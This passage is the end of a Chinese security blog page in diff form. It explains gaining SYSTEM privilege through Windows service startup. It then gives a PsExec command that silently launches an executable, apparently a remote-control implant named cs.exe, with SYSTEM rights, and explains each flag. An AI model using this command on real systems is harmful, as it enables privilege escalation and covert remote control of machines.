+<p>这是借助了windows的特性，这么启动服务的话就是通过system权限启动的，那得到的就是system权限</p>
+<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><ul>
+<li><p>使用微软的远程执行软件PsTools 套件中的PsExec，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+</li>
+<li><p>命令：<code>psexec.exe -accepteula -s -i -d &quot;c:\cs。exe&quot;</code>（要写绝对路径）（<code>-accepteula</code>: 这个参数是为了自动接受第一次运行 <code>psexec</code> 时出现的 EULA（最终用户许可协议，<code>-s</code>: 以system权限执行，<code>-i</code>:允许桌面交互，<code>-d</code>: 用于在后台静默地运行进程。）</p>
+</li>
+</ul>
+
+                </section>
+
+                
+                
+
+                
+
+            </article>
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">JAVA安全</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <div class="al_index_footer dis_flex_center">
+    <div class="al_index_footer_item al_index_footer_title">
+        znskiw
+    </div>
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Created By 
+        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
+         · Power By 
+        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+        
+        
+
+    </body>
+</html>
